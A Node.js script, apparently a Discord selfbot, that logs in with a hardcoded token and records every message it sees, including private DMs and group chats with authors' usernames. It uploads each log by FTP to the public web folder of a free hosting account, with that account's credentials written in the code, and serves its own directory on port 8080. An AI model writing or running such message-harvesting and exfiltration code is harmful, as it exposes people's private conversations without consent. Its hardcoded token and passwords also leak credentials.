var connect = require('connect');
var Discord = require('discord.js');
var fs = require('fs');
const color = require('color');
const ftpClient = require('ftp-client');
var client = new Discord.Client();
var serveStatic = require('serve-static');
var token = "MTkzNDE1NDQxMzUwMjYyNzg0.DjO9QA.WiQgnFb8A3T2XW-Xpu0KVqx6SAQ";

connect().use(serveStatic(__dirname)).listen(8080, function() {
    console.log("server running on 8080");
});

client.login(token);

client.on('ready', () => {
    registerLogs();
});

function makeid() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 5; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

function registerLogs()
{
     client.on("message", function(message)
     {
        var randomName = makeid();
        if (message.channel.type == "dm")
        {
            fs.appendFileSync(randomName + '.message', '[' + 'DM' + ']' + '[' + message.author.username + ']' + ': ' + message.content + '\n', 'utf-8');
        }
        else if (message.channel.type == "group")
        {
            fs.appendFileSync(randomName+ '.message', '[' + 'Group Call' + ']' + '[' + message.author.username + ']' + ': ' + message.content + '\n', 'utf-8');
        }
        else
        {
            fs.appendFileSync(randomName + '.message', '[' + message.channel.guild + ']' + '[' + message.author.username + ']' + ": " + message.content + '\n', 'utf-8');
        }
        config =
        {
            host: 'files.000webhost.com',
            port: 21,
            user: `sayliterallyanything`,
            password: `e550pinxwt`
        },
        options =
        {
            logging: 'basic'
        },
        client3 = new ftpClient(config, options);

        client3.connect(function()
        {
            client3.upload([randomName + '.message**'], '/public_html/',
            {
                baseDir: 'public_html',
                overwrite: 'older'
            }, function(result)
            {
                console.log(result);
            });

        });
    });   
}